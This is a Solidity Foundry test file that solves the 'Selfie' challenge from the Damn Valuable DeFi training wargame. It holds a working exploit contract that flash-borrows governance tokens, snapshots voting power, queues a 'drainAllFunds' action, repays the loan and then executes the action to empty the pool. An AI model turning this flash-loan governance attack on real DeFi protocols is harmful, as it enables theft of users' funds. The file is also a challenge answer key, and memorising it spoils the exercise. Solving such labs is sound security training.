// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import {stdError} from "forge-std/stdlib.sol";

import {Utilities} from "../utils/Utilities.sol";
import {BaseTest} from "../BaseTest.sol";

import "../../DamnValuableTokenSnapshot.sol";
import "../../selfie/SimpleGovernance.sol";
import "../../selfie/SelfiePool.sol";

import "openzeppelin-contracts/utils/Address.sol";


contract Executor {
    using Address for address payable;

    SimpleGovernance governance;
    SelfiePool pool;
    address owner;
    uint256 public drainActionId;

    constructor(SimpleGovernance _governance, SelfiePool _pool) {
        owner = msg.sender;
        governance = _governance;
        pool = _pool;
    }

    function receiveTokens(address tokenAddress, uint256 borrowAmount) external payable {
        require(msg.sender == address(pool), "only pool");

        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            address(owner)
        );

        DamnValuableTokenSnapshot(tokenAddress).snapshot();

        drainActionId = governance.queueAction(address(pool), data, 0);

        // transfer back funds
        DamnValuableTokenSnapshot(tokenAddress).transfer(address(pool), borrowAmount);
    }

    function borrow(uint256 borrowAmount) external {
        require(msg.sender == owner, "only owner");
        pool.flashLoan(borrowAmount);
    }

}

contract SelfieTest is BaseTest {

    uint256 TOKEN_INITIAL_SUPPLY = 2000000 ether; // 2 million tokens
    uint256 TOKENS_IN_POOL = 1500000 ether; // 1.5 million tokens

    DamnValuableTokenSnapshot token;
    SimpleGovernance governance;
    SelfiePool pool;

    address attacker;

    constructor() {
        string[] memory labels = new string[](1);
        labels[0] = "Attacker";

        preSetup(1, labels);
    }

    function setUp() public override {
        super.setUp();

        attacker = users[0];

        // setup contracts
        token = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        vm.label(address(token), "DamnValuableTokenSnapshot");

        governance = new SimpleGovernance(address(token));
        vm.label(address(governance), "SimpleGovernance");

        pool = new SelfiePool(address(token), address(governance));
        vm.label(address(pool), "SelfiePool");

        token.transfer(address(pool), TOKENS_IN_POOL);

        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
    }

    
    function test_Exploit() public {
        runTest();
    }

    function exploit() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(attacker);
        Executor executor = new Executor(governance, pool);
        executor.borrow(TOKENS_IN_POOL);
        vm.stopPrank();

        // warp time to be able to execute the drain action
        utils.mineTime(governance.getActionDelay());
        governance.executeAction(executor.drainActionId());
    }

    function success() internal override {
        /** SUCCESS CONDITIONS */

        assertEq(token.balanceOf(attacker), TOKENS_IN_POOL);

        assertEq(token.balanceOf(address(pool)), 0);
    }
}
